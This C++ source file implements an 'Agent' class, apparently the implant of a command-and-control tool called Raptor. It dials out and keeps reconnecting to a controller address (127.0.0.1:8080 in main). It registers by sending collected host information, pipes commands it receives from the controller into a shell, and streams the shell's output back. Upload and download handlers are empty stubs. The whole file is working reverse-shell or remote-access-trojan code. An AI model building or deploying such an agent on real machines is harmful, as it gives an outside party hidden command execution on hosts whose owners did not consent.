#include "agent.hpp"
#include <print>


Agent::Agent(const std::string& ip, uint16_t port)
: ip_(ip), port_(port)
{
    epollfd_ = ::epoll_create1(0);
    if (epollfd_ == -1)
        throw std::runtime_error(std::format("epoll_create1: {}", strerror(errno)));

    pipfds_ = Pip::create();
    Raptor::Utils::setNonBlocking(pipfds_.err);
    Raptor::Utils::setNonBlocking(pipfds_.out);
    Raptor::Utils::setNonBlocking(pipfds_.in);

    Raptor::Utils::addEpoll(epollfd_,pipfds_.in,  EPOLLERR | EPOLLHUP);
    Raptor::Utils::addEpoll(epollfd_,pipfds_.out, PIPE_READ_FLAGS);
    Raptor::Utils::addEpoll(epollfd_,pipfds_.err, PIPE_READ_FLAGS);
    connect();
}
Agent::~Agent()
{
    if (clientfd_ != -1) ::close(clientfd_);
    if (epollfd_ != -1)  ::close(epollfd_);
}
void Agent::run(){
    for (;;) {
        int n = ::epoll_wait(epollfd_, epollEvents_.data(), MAX_EVENTS, -1);
        if (n < 0) {
            if (errno == EINTR) continue;
            throw std::runtime_error(std::format("epoll_wait: {}", strerror(errno)));
        }

        for (int i = 0; i < n; ++i) {
            const epoll_event& ev = epollEvents_[i];
            const int fd = ev.data.fd;

            if (ev.events & (EPOLLERR | EPOLLHUP | EPOLLRDHUP)) {
                if(fd == clientfd_) connect(); // if errro to the client try to reconnect
                else {
                    epoll_ctl(epollfd_, EPOLL_CTL_DEL, fd, nullptr);
                    ::close(fd);
                }
                continue;
            }

            if (ev.events & EPOLLIN) {
                if (fd == clientfd_)        readClient();
                else if (fd == pipfds_.out || fd == pipfds_.err)
                    readShell(fd);
            }

            if (ev.events & EPOLLOUT) {
                if (fd == pipfds_.in)       writeToShell();
                else if (fd == clientfd_)   writeClient();
            }
        }
    }
}



bool Agent::connect() {
    // if we have connection return false
    if (clientfd_ != -1) {
        Raptor::Utils::delEpoll(epollfd_, clientfd_);
        ::close(clientfd_);
        clientfd_ = -1;
    }
    while (true) {

        if (clientfd_ = socket(AF_INET, SOCK_STREAM, 0); clientfd_ == -1) {
            std::this_thread::sleep_for(std::chrono::seconds(3));
            continue;
        }
        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port   = htons(port_);
        if (inet_pton(AF_INET, ip_.c_str(), &addr.sin_addr) <= 0) {
            ::close(clientfd_); clientfd_ = -1;
            std::this_thread::sleep_for(std::chrono::seconds(3)); continue;
        }
        Raptor::Utils::setNonBlocking(clientfd_);

        if (int rc = ::connect(clientfd_, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)); rc == -1 && errno != EINPROGRESS && errno != EWOULDBLOCK)
        {
            ::close(clientfd_);
            clientfd_ = -1;
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }

        if (!Raptor::Utils::addEpoll(epollfd_,clientfd_, READ_FLAGS )) {
            ::close(clientfd_); clientfd_ = -1;
            std::this_thread::sleep_for(std::chrono::seconds(5)); continue;
        }

        registerAgent();
        return true;
    }
}
void Agent::registerAgent() {
    const auto reg  = Raptor::Utils::collect();
    const auto payload = reg.serialize();

    Raptor::Common::Header hdr{};
    hdr.packetId = 1;
    hdr.type = Raptor::Common::PacketType::Register;
    hdr.direction = Raptor::Common::PacketDirection::Resp;
    hdr.flags = Raptor::Common::Flags::Success | Raptor::Common::Flags::Text;
    hdr.payloadSize = static_cast<uint32_t>(payload.size());

    const auto hdrBuf = hdr.serialize();
    std::vector<uint8_t> pkt;
    pkt.reserve(hdrBuf.size() + payload.size());
    pkt.insert(pkt.end(), hdrBuf.begin(), hdrBuf.end());
    pkt.insert(pkt.end(), payload.begin(), payload.end());
    ::write(clientfd_, pkt.data(), pkt.size());
}

void Agent::flushToClient(Entry& entry) noexcept {
    Raptor::Common::Header hdr{};
    hdr.packetId = entry.taskId;
    hdr.type = Raptor::Common::PacketType::Command;
    hdr.direction = Raptor::Common::PacketDirection::Resp;
    hdr.flags = Raptor::Common::Flags::Success | Raptor::Common::Flags::Text;
    hdr.payloadSize = static_cast<uint32_t>(entry.outLen);
    hdr.serialize(entry.outBuf, Raptor::Common::Header::SIZE);
    Raptor::Utils::rearm(epollfd_,clientfd_, WRITE_FLAGS);
}

void Agent::readClient() noexcept {
    for (;;) {
        ssize_t n = ::read(clientfd_, tmpBuffer_.data(), tmpBuffer_.size());
        if (n == 0) { connect(); return; }
        if (n < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                Raptor::Utils::rearm(epollfd_,clientfd_, READ_FLAGS);
                return;
            }
            if (errno == EINTR) continue;

            connect();
            return;
        }
        feed(tmpBuffer_.data(), static_cast<size_t>(n));
    }
}
void Agent::writeToShell() noexcept {
    if (queue_.empty()) return;
    Entry& entry = queue_.front();

    while (entry.stdinOffset < entry.stdinLen) {
        ssize_t n = ::write(pipfds_.in,
            entry.stdinBuf + entry.stdinOffset,
            entry.stdinLen  - entry.stdinOffset);
        if (n > 0) { entry.stdinOffset += static_cast<size_t>(n); continue; }
        if (n < 0) {
            if (errno == EINTR) continue;
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                Raptor::Utils::rearm(epollfd_,pipfds_.in, PIPE_WRITE_FLAGS);
                return;
            }
            perror("write to shell");
            return;
        }
    }

    Raptor::Utils::rearm(epollfd_,pipfds_.in,  EPOLLERR | EPOLLHUP);
    Raptor::Utils::rearm(epollfd_,pipfds_.out, PIPE_READ_FLAGS);
    Raptor::Utils::rearm(epollfd_,pipfds_.err, PIPE_READ_FLAGS);
}

void Agent::readShell(int fd) noexcept {
    if (queue_.empty()) {
        return;
    }
    Entry& entry = queue_.front();
    for (;;) {
        const size_t capacity = (sizeof(entry.outBuf) - Raptor::Common::Header::SIZE) - entry.outLen;
        if (capacity == 0) {
            flushToClient(entry);
            return;
        }
        ssize_t n = ::read(fd, entry.outBuf + Raptor::Common::Header::SIZE + entry.outLen, capacity);
        if (n < 0 && errno == EINTR) continue;


        if (n > 0) {
            const uint8_t* newData  = entry.outBuf + Raptor::Common::Header::SIZE + entry.outLen;
            const size_t   newBytes = static_cast<size_t>(n);
            const char*  nul  = static_cast<const char*>(memchr(newData, '\0', newBytes));
            const bool   hasMarker = nul
                && (size_t)(nul - (char*)newData) + 5 < newBytes
                && memcmp(nul + 1, "END:", 4) == 0;

            entry.outLen += newBytes;



            if (hasMarker) {
                entry.done = true;
                flushToClient(entry);
                return;
            }
            if(entry.outLen >= FLUSH_THRESHOLD){
                flushToClient(entry);
                return;
            }

            continue;

        }
        if (n == 0) { std::println("[readShell] EOF"); return; }
        if (errno == EAGAIN || errno == EWOULDBLOCK) {
            if(entry.outLen >= FLUSH_THRESHOLD){
                flushToClient(entry);
                return;
            }
            Raptor::Utils::rearm(epollfd_,fd, PIPE_READ_FLAGS);
            return;
        }
        std::println("[readShell] read error errno={}", errno);
        return;
    }
}

void Agent::writeClient() noexcept {
    if (queue_.empty()) {
        return;
    };
    Entry& entry = queue_.front();


    // buffer is empty
    if (entry.outLen == 0) {
        Raptor::Utils::rearm(epollfd_,pipfds_.out, PIPE_READ_FLAGS);
        Raptor::Utils::rearm(epollfd_,pipfds_.err, PIPE_READ_FLAGS);
        return;
    }

    const size_t totalLen = Raptor::Common::Header::SIZE + entry.outLen;


    while (entry.outOffset < totalLen) {
        ssize_t n = ::write(
            clientfd_,
            entry.outBuf + entry.outOffset,
            totalLen - entry.outOffset
        );

        if (n > 0) {
            entry.outOffset += static_cast<size_t>(n);
            continue;
        }

        if (n < 0) {
            if (errno == EINTR)
                continue;
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                Raptor::Utils::rearm(epollfd_,clientfd_, WRITE_FLAGS);
                return;
            }

            perror("write");
            return;
        }
        return;
    }


    entry.outLen = 0;
    entry.outOffset = 0;
    if (entry.done) {
        queue_.pop_front();
        Raptor::Utils::rearm(epollfd_,clientfd_, READ_FLAGS);
        if (!queue_.empty())
            Raptor::Utils::rearm(epollfd_,pipfds_.in, PIPE_WRITE_FLAGS);
    }
    else {
        Raptor::Utils::rearm(epollfd_,pipfds_.out, PIPE_READ_FLAGS);
        Raptor::Utils::rearm(epollfd_,pipfds_.err, PIPE_READ_FLAGS);
    }
}
void Agent::onCommand(const Raptor::Common::Header& hdr, std::string_view cmd) noexcept  {
    hdr.print();
    const std::string marker = Raptor::Utils::makeEndMarker(hdr.packetId);
    const size_t total = cmd.size() + marker.size();
    if (total >= RECV_BUF_SIZE) return;

    Entry e;
    e.taskId = hdr.packetId;
    std::memcpy(e.stdinBuf, cmd.data(), cmd.size());
    std::memcpy(e.stdinBuf + cmd.size(), marker.data(), marker.size());
    e.stdinLen = total;

    queue_.push_back(std::move(e));
    Raptor::Utils::rearm(epollfd_,pipfds_.in, PIPE_WRITE_FLAGS);
}

void Agent::onUpload (const Raptor::Common::Header&, std::string_view) noexcept {}
void Agent::onDownload(const Raptor::Common::Header&, std::string_view) noexcept {}

int main() {
    try {
        Agent agent("127.0.0.1", 8080);
        agent.run();
    } catch (const std::exception& e) {
        std::println(stderr, "Fatal: {}", e.what());
        return 1;
    }
}
